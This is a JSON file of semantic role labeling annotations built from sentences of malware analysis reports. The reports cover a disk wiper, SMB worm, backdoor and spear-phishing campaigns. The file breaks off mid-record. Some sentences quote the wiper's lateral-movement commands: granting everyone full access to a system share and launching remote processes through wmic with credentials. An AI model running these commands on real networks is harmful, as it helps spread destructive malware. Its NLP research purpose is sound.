"configured", "index": 20}, "ARG4": {"text": "to listen on TCP port 443"}}, "listen": {"V": {"text": "listen", "index": 22}, "ARG1": {"text": "on TCP port 443"}}}, " Each message sent to\nand from this implant is preceded with its length, then XOR encoded with the byte 0x1F": {"sent": {"ARG1": {"text": "Each message"}, "V": {"text": "sent", "index": 2}, "ARG2": {"text": "to"}}, "is": {"V": {"text": "is", "index": 8}}, "preceded": {"ARG0": {"text": "Each message sent to and from this implant"}, "V": {"text": "preceded", "index": 9}, "ARGM-MNR": {"text": "with its length , then XOR encoded with the byte 0x1F"}}, "encoded": {"ARGM-TMP": {"text": "then"}, "ARG1": {"text": "XOR"}, "V": {"text": "encoded", "index": 16}, "ARGM-MNR": {"text": "with the byte 0x1F"}}}, " The listener can also perform arbitrary code execution and execute commands on the command line": {"can": {"V": {"text": "can", "index": 2}}, "perform": {"ARG0": {"text": "The listener"}, "ARGM-MOD": {"text": "can"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "perform", "index": 4}, "ARG1": {"text": "arbitrary code execution"}}, "execute": {"ARG0": {"text": "The listener"}, "ARGM-MOD": {"text": "can"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "execute", "index": 9}, "ARG1": {"text": "commands"}, "ARG3": {"text": "on the command line"}}}, " The malware uses several methods to access shares on the remote systems to\nbegin wiping files": {"uses": {"ARG0": {"text": "The malware"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "several methods"}, "ARG2": {"text": "to access shares on the remote systems to begin wiping files"}}, "access": {"ARG0": {"text": "The malware"}, "V": {"text": "access", "index": 6}, "ARG1": {"text": "shares"}, "ARGM-LOC": {"text": "on the remote systems"}, "ARGM-PRP": {"text": "to begin wiping files"}}, "begin": {"ARG0": {"text": "The malware"}, "V": {"text": "begin", "index": 13}, "ARG1": {"text": "wiping files"}}, "wiping": {"V": {"text": "wiping", "index": 14}, "ARG1": {"text": "files"}}}, " It has 3 files contained in the resource section; all xor\u2019d with 0x63": {"has": {"ARG0": {"text": "It"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "3 files contained in the resource section"}}, "contained": {"ARG1": {"text": "3 files"}, "V": {"text": "contained", "index": 4}, "ARG0": {"text": "in the resource section"}}}, " Once successful, the malware uploads a copy of the wiper file \u201ctaskhostXX.exe\u201d, changes the file-time\nto match that of the built-in file \u201ccalc.exe\u201d, and starts the remote process": {"uploads": {"ARGM-TMP": {"text": "Once successful"}, "ARG0": {"text": "the malware"}, "V": {"text": "uploads", "index": 5}, "ARG1": {"text": "a copy of the wiper file \u201c taskhostXX.exe"}}, "changes": {"ARGM-TMP": {"text": "Once successful"}, "ARG0": {"text": "the malware uploads a copy of the wiper file \u201c taskhostXX.exe"}, "V": {"text": "changes", "index": 16}, "ARG1": {"text": "the file - time"}, "ARGM-PRP": {"text": "to match that of the built - in file \u201c calc.exe \u201d"}}, "match": {"ARGM-TMP": {"text": "the file - time"}, "V": {"text": "match", "index": 22}, "ARG1": {"text": "that of the built - in file \u201c calc.exe \u201d"}}, "built": {"V": {"text": "built", "index": 26}, "ARG1": {"text": "file"}}, "starts": {"ARGM-TMP": {"text": "Once successful"}, "ARG0": {"text": "the malware uploads a copy of the wiper file \u201c taskhostXX.exe"}, "V": {"text": "starts", "index": 35}, "ARG1": {"text": "the remote process"}}}, " Based on the\nusername/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to\nupload a copy of the wiper and begin the wiping process on these remote systems": {"Based": {"V": {"text": "Based", "index": 0}, "ARG2": {"text": "on the username / password provided in the configuration file and the hostname / IP address of target systems"}}, "provided": {"ARG1": {"text": "the username / password"}, "V": {"text": "provided", "index": 6}, "ARGM-LOC": {"text": "in the configuration file and the hostname / IP address of target systems"}}, "will": {"ARGM-ADV": {"text": "Based on the username / password provided in the configuration file and the hostname / IP address of target systems"}, "ARG0": {"text": "the malware"}, "V": {"text": "will", "index": 23}, "ARG1": {"text": "access remote network shares"}, "ARGM-PRP": {"text": "in order to upload a copy of the wiper and begin the wiping process on these remote systems"}}, "access": {"ARGM-ADV": {"text": "Based on the username / password provided in the configuration file and the hostname / IP address of target systems"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "access", "index": 24}, "ARG1": {"text": "remote network shares"}, "ARGM-PRP": {"text": "in order to upload a copy of the wiper and begin the wiping process on these remote systems"}}, "upload": {"V": {"text": "upload", "index": 31}, "ARG1": {"text": "a copy of the wiper"}}, "begin": {"ARG0": {"text": "the malware"}, "V": {"text": "begin", "index": 38}, "ARG1": {"text": "the wiping process on these remote systems"}}, "wiping": {"V": {"text": "wiping", "index": 40}}}, "\n\n\n<list>\nName: iissvr.exe\n\nSize: 114688 bytes (114.7 KB)\n\nMD5: E1864A55D5CCB76AF4BF7A0AE16279BA\n\nPE Compile Time: 2014-11-13 02:05:35\n</list>\n\n\nThis file, when executed, starts a listener on localhost port 80": {"executed": {"ARGM-TMP": {"text": "when"}, "V": {"text": "executed", "index": 4}}, "starts": {"ARG0": {"text": "This file"}, "ARGM-TMP": {"text": "when executed"}, "V": {"text": "starts", "index": 6}, "ARG1": {"text": "a listener on localhost port 80"}}}, "\n\nListening Implant: During installation of this tool, a portion of the binaries is decrypted using AES, with a key derived from the phrase \"National Football League.\"\nAdditionally, this implant listens for connections on TCP port 195 (for \"sensvc.exe\" and \"msensvc.exe\") and TCP port 444 (for \"netcfg.dll\")": {"Listening": {"V": {"text": "Listening", "index": 0}, "ARG1": {"text": "Implant"}}, "is": {"V": {"text": "is", "index": 14}}, "decrypted": {"ARGM-TMP": {"text": "During installation of this tool"}, "ARG1": {"text": "a portion of the binaries"}, "V": {"text": "decrypted", "index": 15}, "ARGM-MNR": {"text": "using AES/ with a key derived from the phrase \" National Football League"}}, "using": {"ARG0": {"text": "a portion of the binaries"}, "V": {"text": "using", "index": 16}, "ARG1": {"text": "AES"}}, "derived": {"ARG1": {"text": "a key"}, "V": {"text": "derived", "index": 22}, "ARG2": {"text": "from the phrase \" National Football League"}}, "listens": {"ARG0": {"text": "this implant"}, "V": {"text": "listens", "index": 36}, "ARG1": {"text": "for connections on TCP port 195 ( for \" sensvc.exe \" and \" msensvc.exe"}}}, " It is dropped from resource ID 0x81 of \u201cigfxtrayex.exe\u201d": {"is": {"V": {"text": "is", "index": 1}}, "dropped": {"ARG1": {"text": "It"}, "V": {"text": "dropped", "index": 2}, "ARG2": {"text": "from resource ID 0x81 of \u201c"}}}, " It connects home every five minutes to send log data\nback to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445": {"connects": {"ARG0": {"text": "It"}, "V": {"text": "connects", "index": 1}, "ARG2": {"text": "home"}, "ARGM-TMP": {"text": "every five minutes"}, "ARGM-PRP": {"text": "to send log data back to command and control ( C2 ) infrastructure if it has successfully spread to other Windows hosts via SMB port 445"}}, "send": {"V": {"text": "send", "index": 7}, "ARG1": {"text": "log data"}, "ARGM-DIR": {"text": "back"}, "ARG2": {"text": "to command and control ( C2 ) infrastructure"}, "ARGM-ADV": {"text": "if it has successfully spread to other Windows hosts via SMB port 445"}}, "has": {"V": {"text": "has", "index": 21}}, "spread": {"ARG1": {"text": "it"}, "ARGM-MNR": {"text": "successfully/ via SMB port 445"}, "V": {"text": "spread", "index": 23}, "ARGM-DIR": {"text": "to other Windows hosts"}}}, " Network connection attempts are made to one of three hard-coded IP addresses in a random\norder to port 8080 or 8000": {"are": {"V": {"text": "are", "index": 3}}, "made": {"R-ARG1": {"text": "Network connection attempts"}, "V": {"text": "made", "index": 4}, "ARG1": {"text": "to port 8080 or 8000"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 11}, "ARG1": {"text": "IP addresses"}}, "port": {"V": {"text": "port", "index": 19}, "ARG1": {"text": "8080 or 8000"}}}, "\n\nDestructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim\nmachine\u2019s recovery": {"is": {"ARG1": {"text": "This tool"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "a tailored hard - drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim machine \u2019s recovery"}}, "tailored": {"V": {"text": "tailored", "index": 9}, "ARG1": {"text": "hard - drive wiping tool"}}, "wiping": {"ARG1": {"text": "tailored/ hard - drive"}, "V": {"text": "wiping", "index": 13}, "ARG0": {"text": "tool"}}, "is_2": {"V": {"text": "is", "index": 16}}, "intended": {"ARG2": {"text": "a tailored hard - drive wiping tool"}, "R-ARG2": {"text": "that"}, "V": {"text": "intended", "index": 17}, "ARG1": {"text": "to destroy data past the point of recovery and to complicate the victim machine \u2019s recovery"}}, "destroy": {"R-ARG0": {"text": "that"}, "V": {"text": "destroy", "index": 19}, "ARG1": {"text": "data"}, "ARGM-TMP": {"text": "past the point of recovery"}}, "complicate": {"ARG0": {"text": "that"}, "V": {"text": "complicate", "index": 28}, "ARG1": {"text": "the victim machine \u2019s recovery"}}}, " (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines\nwill continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.) If the actor has\nuser-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable": {"is": {"V": {"text": "is", "index": 2}, "ARG1": {"text": "a caveat for machines installed with the windows 7 operating system"}}, "installed": {"ARG1": {"text": "a caveat/ machines"}, "V": {"text": "installed", "index": 7}, "ARG2": {"text": "with the windows 7 operating system"}}, "will": {"V": {"text": "will", "index": 18}}, "continue": {"ARGM-MOD": {"text": "will"}, "V": {"text": "continue", "index": 19}, "ARG1": {"text": "to operate in a degraded state with the targeted files destroyed until after reboot/ in which the infected MBR then wipes the drive"}}, "operate": {"ARG1": {"text": "windows 7 machines"}, "V": {"text": "operate", "index": 21}, "ARGM-MNR": {"text": "in a degraded state/ with the targeted files destroyed until after reboot"}, "ARGM-ADV": {"text": "in which the infected MBR then wipes the drive"}}, "targeted": {"V": {"text": "targeted", "index": 28}, "ARG1": {"text": "files"}}, "destroyed": {"ARG1": {"text": "the targeted files"}, "V": {"text": "destroyed", "index": 30}, "ARGM-TMP": {"text": "until after reboot , in which the infected MBR then wipes the drive"}}, "infected": {"V": {"text": "infected", "index": 38}, "ARG1": {"text": "MBR"}}, "wipes": {"R-ARGM-LOC": {"text": "in which"}, "ARG0": {"text": "the infected MBR"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "wipes", "index": 41}, "ARG1": {"text": "the drive"}}, "has": {"ARG0": {"text": "the actor"}, "V": {"text": "has", "index": 49}, "ARG1": {"text": "user - level access"}}, "includes": {"ARGM-ADV": {"text": "If the actor has user - level access"}, "ARG2": {"text": "the result"}, "V": {"text": "includes", "index": 57}, "ARG1": {"text": "specific files being deleted and practically irrecoverable"}}, "being": {"ARG1": {"text": "specific files"}, "V": {"text": "being", "index": 60}, "ARG2": {"text": "deleted and practically irrecoverable"}}, "deleted": {"ARG1": {"text": "specific files"}, "V": {"text": "deleted", "index": 61}}, "would": {"ARG1": {"text": "the victim machine"}, "V": {"text": "would", "index": 70}, "ARGM-PRD": {"text": "remain usable"}}, "remain": {"ARG1": {"text": "the victim machine"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "remain", "index": 71}, "ARG3": {"text": "usable"}}}, " A 120-minute (2 hour)\nsleep command is issued after which the computer is shut down and rebooted": {"is": {"V": {"text": "is", "index": 8}}, "issued": {"ARG1": {"text": ") sleep command"}, "V": {"text": "issued", "index": 9}, "ARGM-TMP": {"text": "after which the computer is shut down and rebooted"}}, "is_2": {"V": {"text": "is", "index": 14}}, "shut": {"ARGM-TMP": {"text": "after which"}, "ARG1": {"text": "the computer"}, "V": {"text": "shut", "index": 15}}, "rebooted": {"ARGM-TMP": {"text": "after which"}, "ARG1": {"text": "the computer"}, "V": {"text": "rebooted", "index": 18}}}, " The \u201cWinsSchMgmt\u201d service\nexecuted the file with \u201c-k\u201d as an argument, which started another instance of the file using \u201c-s\u201d as an argument": {"executed": {"ARG0": {"text": "The \u201c WinsSchMgmt \u201d service"}, "V": {"text": "executed", "index": 5}, "ARG1": {"text": "the file"}, "ARGM-MNR": {"text": "with \u201c -k \u201d as an argument , which started another instance of the file using \u201c -s \u201d as an argument"}}, "started": {"ARG0": {"text": "an argument"}, "R-ARG0": {"text": "which"}, "V": {"text": "started", "index": 17}, "ARG1": {"text": "another instance of the file"}, "ARG2": {"text": "using \u201c -s \u201d as an argument"}}, "using": {"V": {"text": "using", "index": 23}, "ARG1": {"text": "\u201c -s \u201d"}, "ARG2": {"text": "as an argument"}}}, " Checking for existing shares via \u201c\\\\hostname\\admin$\\system32\u201d and \u201c\\\\hostname\\shared$\\system32\u201d or create a new share \u201ccmd.exe /q /c net\nshare shared$=%SystemRoot% /GRANT:everyone, FULL\u201d": {"Checking": {"V": {"text": "Checking", "index": 0}, "ARGM-PRP": {"text": "for existing shares"}, "ARGM-MNR": {"text": "via \u201c \\\\hostname\\admin$\\system32"}}, "existing": {"V": {"text": "existing", "index": 2}, "ARG1": {"text": "shares"}}, "create": {"V": {"text": "create", "index": 13}, "ARG1": {"text": "a new share \u201c cmd.exe /q"}}}, "\n\n\n<list>\nName: igfxtrayex.exe\n\fSize: 249856 bytes (249.9 KB)\n\nMD5: 760C35A80D758F032D02CF4DB12D3E55\n\nPE Compile Time: 2014-11-24 04:11:08\n</list>\n\n\nThis file is destructive malware: a disk wiper with network beacon capabilities": {"is": {"ARG1": {"text": "This file"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "destructive malware : a disk wiper with network beacon capabilities"}}}, " If the CNE operator has administrator-level privileges on the host, the program will over-write portions of up-to the first four physical drives\nattached, and over-write the master boot record (MBR) with a program designed to cause further damage if the hard drive is re-booted": {"has": {"ARG0": {"text": "the CNE operator"}, "V": {"text": "has", "index": 4}, "ARG1": {"text": "administrator - level privileges"}, "ARGM-LOC": {"text": "on the host"}}, "will": {"ARGM-ADV": {"text": "If the CNE operator has administrator - level privileges on the host"}, "ARG0": {"text": "the program"}, "V": {"text": "will", "index": 15}, "ARG1": {"text": "over - write portions of up - to the first four physical drives attached/ over"}}, "write": {"ARGM-ADV": {"text": "If the CNE operator has administrator - level privileges on the host"}, "ARG0": {"text": "the program"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "write", "index": 18}, "ARG1": {"text": "portions/ of up"}}, "attached": {"ARG1": {"text": "the first four physical drives"}, "V": {"text": "attached", "index": 29}}, "write_2": {"ARGM-ADV": {"text": "If the CNE operator has administrator - level privileges on the host"}, "ARG0": {"text": "the program"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "write", "index": 34}, "ARG1": {"text": "the master boot record ( MBR )"}, "ARGM-MNR": {"text": "with a program designed to cause further damage if the hard drive is re - booted"}}, "designed": {"ARG1": {"text": "a program"}, "V": {"text": "designed", "index": 45}, "ARG3": {"text": "to cause further damage if the hard drive is re - booted"}}, "is": {"ARG1": {"text": "the hard drive"}, "V": {"text": "is", "index": 54}, "ARG2": {"text": "re - booted"}}}, " The controller sends the byte \"!\" (0x21) to end the network connection": {"sends": {"ARG0": {"text": "The controller"}, "V": {"text": "sends", "index": 2}, "ARG1": {"text": "the byte/ \" ( 0x21 )"}, "ARG2": {"text": "to end the network connection"}}, "end": {"V": {"text": "end", "index": 12}, "ARG1": {"text": "the network connection"}}}, "\n\n\n<list>\nName: net_ver.dat\n\nSize: 4572 bytes (4.6 KB) (size will vary)\n\nMD5: 93BC819011B2B3DA8487F964F29EB934 (hash will vary)\n</list>\n\n\nThis is a log file created by the dropper, and appended to as the scans progress": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a log file created by the dropper , and appended to as the scans progress"}}, "created": {"ARG1": {"text": "a log file"}, "V": {"text": "created", "index": 5}, "ARG0": {"text": "by the dropper"}}, "appended": {"ARG1": {"text": "This"}, "V": {"text": "appended", "index": 11}, "ARG2": {"text": "to as the scans progress"}}, "progress": {"ARGM-MNR": {"text": "scans"}, "V": {"text": "progress", "index": 16}}}, " This tool contains five components \u2013 a listening implant, lightweight backdoor,\nproxy tool, destructive hard drive tool, and destructive target cleaning tool": {"contains": {"ARG0": {"text": "This tool"}, "V": {"text": "contains", "index": 2}, "ARG1": {"text": "five components \u2013 a listening implant , lightweight backdoor , proxy tool , destructive hard drive tool , and destructive target cleaning tool"}}}, " The second instance of the dropper file\ninstalled itself as the \u201cWinsSchMgmt\u201d service with \u201c-k\u201d as a command line argument, started the service, and then terminated": {"installed": {"ARG0": {"text": "The second instance of the dropper file"}, "V": {"text": "installed", "index": 7}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as the \u201c WinsSchMgmt \u201d service with \u201c -k \u201d as a command line argument"}}, "started": {"ARG0": {"text": "The second instance of the dropper file installed itself as the \u201c WinsSchMgmt \u201d service with \u201c -k \u201d as a command line argument"}, "V": {"text": "started", "index": 25}, "ARG1": {"text": "the service"}}, "terminated": {"ARG0": {"text": "The second instance of the dropper file"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "terminated", "index": 31}}}, " Afterwards, the\nremote network share is removed via \u201ccmd.exe /q /c net share shared$ /delete\u201d": {"is": {"V": {"text": "is", "index": 6}}, "removed": {"ARGM-TMP": {"text": "Afterwards"}, "ARG1": {"text": "the remote network share"}, "V": {"text": "removed", "index": 7}, "ARGM-MNR": {"text": "via \u201c cmd.exe /q /c net share shared$ /delete \u201d"}}}, " The remote process is started via the command \u201ccmd.exe /c wmic.exe /node:hostname\n/user:username /password:pass PROCESS CALL CREATE\u201d": {"is": {"V": {"text": "is", "index": 3}}, "started": {"ARG1": {"text": "The remote process"}, "V": {"text": "started", "index": 4}, "ARGM-MNR": {"text": "via the command \u201c cmd.exe /c wmic.exe /node : hostname /user : username /password : pass PROCESS CALL CREATE \u201d"}}, "pass": {"V": {"text": "pass", "index": 20}, "ARG1": {"text": "PROCESS"}}}, " The tool also accepts new scan tasking\nwhen it connects to C2": {"accepts": {"ARG0": {"text": "The tool"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "accepts", "index": 3}, "ARG1": {"text": "new scan tasking when it connects to C2"}}, "tasking": {"ARG1": {"text": "new scan"}, "V": {"text": "tasking", "index": 6}}, "connects": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "it"}, "V": {"text": "connects", "index": 9}, "ARG1": {"text": "to C2"}}}, " This file serves as a dropper": {"serves": {"ARG0": {"text": "This file"}, "V": {"text": "serves", "index": 2}, "ARG1": {"text": "as a dropper"}}}, " It drops destructive malware: \u201cigfxtrayex.exe\u201d": {"drops": {"ARG0": {"text": "It"}, "V": {"text": "drops", "index": 1}, "ARG1": {"text": "destructive malware"}}}, " If a connection to the IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all\nthree IP addresses have been attempted": {"be": {"V": {"text": "be", "index": 9}}, "made": {"ARG1": {"text": "a connection to the IP address"}, "ARGM-MOD": {"text": "can"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "made", "index": 10}}, "attempts": {"ARGM-ADV": {"text": "If a connection to the IP address can not be made"}, "ARG0": {"text": "it"}, "V": {"text": "attempts", "index": 13}, "ARG1": {"text": "to connect to another of the three IP addresses"}, "ARGM-TMP": {"text": "until connections to all three IP addresses have been attempted"}}, "connect": {"ARG0": {"text": "it"}, "V": {"text": "connect", "index": 15}, "ARG1": {"text": "to another of the three IP addresses"}}, "have": {"V": {"text": "have", "index": 31}}, "been": {"V": {"text": "been", "index": 32}}, "attempted": {"ARG1": {"text": "connections to all three IP addresses"}, "V": {"text": "attempted", "index": 33}}}, "\n\nLightweight Backdoor: This is a backdoor listener that is designed as a service DLL": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "a backdoor listener that is designed as a service DLL"}}, "is_2": {"V": {"text": "is", "index": 9}}, "designed": {"ARG1": {"text": "a backdoor listener"}, "R-ARG1": {"text": "that"}, "V": {"text": "designed", "index": 10}, "ARG3": {"text": "as a service DLL"}}}, " After 10 minutes, the \u201cigfxtrayex.exe\u201d makes three copies of itself and places them in the same directory from which it was executed": {"makes": {"ARGM-TMP": {"text": "After 10 minutes"}, "ARG0": {"text": "the \u201c igfxtrayex.exe \u201d"}, "V": {"text": "makes", "index": 8}, "ARG1": {"text": "three copies of itself"}}, "places": {"ARGM-TMP": {"text": "After 10 minutes"}, "ARG0": {"text": "the \u201c igfxtrayex.exe \u201d"}, "V": {"text": "places", "index": 14}, "ARG1": {"text": "them"}, "ARG2": {"text": "in the same directory from which it was executed"}}, "was": {"V": {"text": "was", "index": 23}}, "executed": {"ARG2": {"text": "the same directory"}, "R-ARG2": {"text": "from which"}, "ARG1": {"text": "it"}, "V": {"text": "executed", "index": 24}}}, "\n\nSMB Worm Tool: This worm uses a brute force authentication attack to propagate via Windows SMB shares": {"uses": {"ARG0": {"text": "This worm"}, "V": {"text": "uses", "index": 6}, "ARG1": {"text": "a brute force authentication attack"}, "ARG2": {"text": "to propagate via Windows SMB shares"}}, "propagate": {"V": {"text": "propagate", "index": 13}, "ARGM-MNR": {"text": "via Windows SMB shares"}}}, " These copies are then executed, each with a\ndifferent argument (one being \u201c-m\u201d, one being \u201c-d\u201d and the other \u201c-w\u201d)": {"are": {"V": {"text": "are", "index": 2}}, "executed": {"ARG1": {"text": "These copies"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "executed", "index": 4}, "ARGM-MNR": {"text": "each with a different argument ( one being \u201c -m \u201d"}, "ARGM-ADV": {"text": ", one being \u201c -d \u201d and the other \u201c -w \u201d )"}}, "being": {"V": {"text": "being", "index": 13}, "ARG2": {"text": "\u201c -m \u201d"}}, "being_2": {"V": {"text": "being", "index": 19}, "ARG2": {"text": "\u201c -d \u201d"}}}, " One is to send spear phishing\nemails, where a link to a malicious website or a malicious attachment is delivered using social engineering\ntechniques": {"is": {"ARG1": {"text": "One"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "to send spear phishing emails , where a link to a malicious website or a malicious attachment is delivered using social engineering techniques"}}, "send": {"V": {"text": "send", "index": 3}, "ARG1": {"text": "spear phishing emails , where a link to a malicious website or a malicious attachment is delivered using social engineering techniques"}}, "phishing": {"V": {"text": "phishing", "index": 5}, "ARG1": {"text": "emails"}}, "is_2": {"V": {"text": "is", "index": 19}}, "delivered": {"ARGM-LOC": {"text": "spear phishing emails"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "a link to a malicious website or a malicious attachment"}, "V": {"text": "delivered", "index": 20}, "ARGM-MNR": {"text": "using social engineering techniques"}}, "using": {"ARG0": {"text": "a link to a malicious website or a malicious attachment"}, "V": {"text": "using", "index": 21}, "ARG1": {"text": "social engineering techniques"}}}, "\n\n    A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted\n    company": {"phishing": {"V": {"text": "phishing", "index": 4}, "ARG1": {"text": "emails"}}, "were": {"V": {"text": "were", "index": 6}}, "sent": {"ARG1": {"text": "A wave of spear phishing emails"}, "V": {"text": "sent", "index": 7}, "ARGM-DIR": {"text": "from two Freemailer accounts"}, "ARG2": {"text": "to 291 individuals at the targeted company"}}, "targeted": {"V": {"text": "targeted", "index": 17}, "ARG1": {"text": "company"}}}, " In\n  addition, spear phishing messages were used to compromise additional computers": {"phishing": {"ARGM-MNR": {"text": "spear"}, "V": {"text": "phishing", "index": 4}, "ARG0": {"text": "messages"}}, "were": {"V": {"text": "were", "index": 6}}, "used": {"ARGM-DIS": {"text": "In addition"}, "ARG1": {"text": "spear phishing messages"}, "V": {"text": "used", "index": 7}, "ARG2": {"text": "to compromise additional computers"}}, "compromise": {"ARG0": {"text": "spear phishing messages"}, "V": {"text": "compromise", "index": 9}, "ARG1": {"text": "additional computers"}}}, " The second method, which is gaining traction, is watering hole attacks, where the attacker infects a\nwebsite that has a high likelihood of being visited by the intended victim": {"is": {"V": {"text": "is", "index": 5}}, "gaining": {"ARG1": {"text": "The second method"}, "R-ARG1": {"text": "which"}, "V": {"text": "gaining", "index": 6}, "ARGM-MNR": {"text": "traction"}}, "is_2": {"ARG1": {"text": "The second method , which is gaining traction ,"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "watering hole attacks , where the attacker infects a website that has a high likelihood of being visited by the intended victim"}}, "watering": {"V": {"text": "watering", "index": 10}, "ARG1": {"text": "hole attacks , where the attacker infects a website that has a high likelihood of being visited by the intended victim"}}, "infects": {"ARGM-LOC": {"text": "watering hole attacks"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the attacker"}, "V": {"text": "infects", "index": 17}, "ARG1": {"text": "a website that has a high likelihood of being visited by the intended victim"}}, "has": {"ARG0": {"text": "a website"}, "R-ARG0": {"text": "that"}, "V": {"text": "has", "index": 21}, "ARG1": {"text": "a high likelihood of being visited by the intended victim"}}, "being": {"V": {"text": "being", "index": 26}}, "visited": {"V": {"text": "visited", "index": 27}, "ARG0": {"text": "by the intended victim"}}, "intended": {"V": {"text": "intended", "index": 30}, "ARG1": {"text": "victim"}}}, "\n\n    It is also clear that the energy sector is not exempt from the generic attacks that every company faces, such\n    as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details": {"is": {"V": {"text": "is", "index": 1}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "clear"}, "ARG1": {"text": "that the energy sector is not exempt from the generic attacks that every company faces , such as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details"}}, "is_2": {"ARG1": {"text": "the energy sector"}, "V": {"text": "is", "index": 8}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "exempt from the generic attacks that every company faces , such as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details"}}, "faces": {"ARG1": {"text": "the generic attacks"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "every company"}, "V": {"text": "faces", "index": 18}}, "locks": {"ARG0": {"text": "ransomware"}, "R-ARG0": {"text": "that"}, "V": {"text": "locks", "index": 24}, "ARG1": {"text": "PCs or financial Trojans"}}, "attempt": {"ARG0": {"text": "the/ such as ransomware that locks PCs or financial Trojans"}, "R-ARG0": {"text": "that"}, "V": {"text": "attempt", "index": 30}, "ARG1": {"text": "to steal passwords and credit card details"}}, "steal": {"ARG0": {"text": "that"}, "V": {"text": "steal", "index": 32}, "ARG1": {"text": "passwords and credit card details"}}}, "\n\n  The dropper component is responsible for creating all the required files on the system, registering a service\n  called \u201cTrkSvr\u201d in order to start itself with Windows": {"is": {"ARG1": {"text": "The dropper component"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "responsible for creating all the required files on the system , registering a service called \u201c TrkSvr \u201d in order to start itself with Windows"}}, "creating": {"V": {"text": "creating", "index": 6}, "ARG1": {"text": "all the required files on the system"}}, "required": {"V": {"text": "required", "index": 9}, "ARG1": {"text": "files"}}, "registering": {"V": {"text": "registering", "index": 15}, "ARG1": {"text": "a service called \u201c TrkSvr \u201d"}, "ARGM-PRP": {"text": "in order to start itself with Windows"}}, "called": {"ARG1": {"text": "a service"}, "V": {"text": "called", "index": 18}, "ARG2": {"text": "\u201c TrkSvr \u201d"}}, "start": {"V": {"text": "start", "index": 25}, "ARG1": {"text": "itself"}, "ARG2": {"text": "with Windows"}}}, " With more specialized teams of attackers, we can often observe that the\ninfected system is first analyzed to ensure that it is of interest to them": {"can": {"V": {"text": "can", "index": 8}}, "observe": {"ARGM-MNR": {"text": "With more specialized teams of attackers"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "observe", "index": 10}, "ARG1": {"text": "that the infected system is first analyzed to ensure that it is of interest to them"}}, "is": {"ARG1": {"text": "the infected system"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "first analyzed"}}, "analyzed": {"ARG1": {"text": "the infected system"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "analyzed", "index": 17}}, "ensure": {"V": {"text": "ensure", "index": 19}, "ARG1": {"text": "that it is of interest to them"}}, "is_2": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 22}, "ARG2": {"text": "of interest"}, "ARGM-GOL": {"text": "to them"}}}, " For example, some malware\nsamples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might\nattract attention": {"will": {"V": {"text": "will", "index": 6}}, "send": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "some malware samples"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "send", "index": 7}, "ARG1": {"text": "the data"}, "ARG2": {"text": "in smaller bursts"}, "ARGM-PRP": {"text": "so as not to swamp the network or generate network spikes that might attract attention"}}, "swamp": {"ARGM-NEG": {"text": "not"}, "V": {"text": "swamp", "index": 17}, "ARG1": {"text": "the network"}}, "generate": {"V": {"text": "generate", "index": 21}, "ARG1": {"text": "network spikes that might attract attention"}}, "might": {"ARG0": {"text": "network spikes"}, "R-ARG0": {"text": "that"}, "V": {"text": "might", "index": 25}, "ARG1": {"text": "attract attention"}}, "attract": {"ARG0": {"text": "network spikes"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "attract", "index": 26}, "ARG1": {"text": "attention"}}}, "\n\n    The back door provides full remote access to the compromised computers, allowing for extraction of any data": {"provides": {"ARG0": {"text": "The back door"}, "V": {"text": "provides", "index": 3}, "ARG1": {"text": "full remote access to the compromised computers"}, "ARGM-ADV": {"text": "allowing for extraction of any data"}}, "compromised": {"V": {"text": "compromised", "index": 9}, "ARG1": {"text": "computers"}}, "allowing": {"V": {"text": "allowing", "index": 12}, "ARG1": {"text": "for extraction of any data"}}}, " This halted machinery, preventing oil tankers from loading for eight hour till the unaffected\n    backup code was reinstalled on the PLCs": {"halted": {"ARG0": {"text": "This"}, "V": {"text": "halted", "index": 1}, "ARG1": 